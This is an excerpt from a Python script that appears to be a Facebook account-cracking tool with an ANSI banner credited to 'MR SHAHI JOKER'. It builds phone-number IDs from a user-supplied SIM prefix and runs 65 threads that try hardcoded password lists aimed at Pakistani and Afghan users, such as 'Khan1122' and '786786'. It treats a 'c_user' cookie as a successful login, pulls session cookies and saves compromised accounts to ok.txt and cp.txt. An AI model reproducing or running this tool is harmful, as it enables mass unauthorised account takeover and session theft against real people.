...
[+]═══════════════════════════════════════════
\033[1;37m[+] \033[1;37mCREATED BY   :  \033[1;37m𝗠𝗥 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥
\033[1;37m[+] \033[1;37mON FACEBOK   :  \033[1;37m 𝗞𝗵𝗔𝗻𝗼𝗼 𝗝𝗢𝗞𝗘𝗥
\033[1;37m[+] \033[1;37mON GITHUB    :  \033[1;37m𝗛𝗮𝗷𝗶 𝗦𝗵𝗮𝗵𝗶.𝗷𝗼𝗸𝗲𝗿
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9370,9375,9377,9378.ETC')
	print('[+]═══════════════════════════════════════════')
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'Afghan890890','Khan1122','KhanKhan1','Haji Khan','Khan123','KhanKhan123','Khan1234','1234567','KhanKhan1122','KhanKhan12345','Afg12345','786786','afg1122','Afghan123456','Afghanistan12345']
...
def random_number2():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :9218,92345,9323,92306.ETC')
	print('[+]═══════════════════════════════════════════')
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	limit = int(input('[+]How many numbers do you want to add ? '))
	for nmbr in range(limit):
...
def random_number6():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [kode, kode+guru,'KhanKhan1','Khan12','Khan123','KhanKhan123','Khan1234','1234567','Khan1Khan1122','Khan1Khan12345','KhanKhan1Khan1','786786','Khan1122','Khan123456','KhanKhanKhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"—") 
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
...
def mcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			sys.stdout.write(f'\r [\033[1;97mKhan1\033[1;97m] [%s] OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[Khan1-OK] '+cid+' | '+ps+'\033[1;32m')
...
def random_number3():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'KhanKhan','Khan12','Khan123','KhanKhan123','Khan1234','1234567','KhanKhan1122','KhanKhan12345','KhanKhanKhan1','786786','Khan1122','Khan123456','KhanKhanKhan1122']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def random_number4():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'KhanKhan','Khan1122','Khan12','Khan12345','KhanKhan','Khan112','Khan1123','KhanKhan1123','Khan11234','1234567','KhanKhan1122','KhanKhan112345','KhanKhanKhan','786786','Khan1122','Khan123456','KhanKhanKhan1122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
...
def random_number5():
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,'aliali','ali1122','i love you','Khan1Khan1','Khan112','Khan1123','Khan1Khan1123','Khan11234','1234567','Khan1Khan11122','Khan1Khan112345','Khan1Khan1Khan1','786786','Khan11122','Khan1123456','Khan1Khan1Khan11122']
			yaari.submit(mcrack,uid,pwx,tl)
	print(50*'-')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;91m[Khan1-CP] '+cid+' | '+ps+'\33[0;97m')
...
def mbcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mKhan1\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
			sys.stdout.flush()
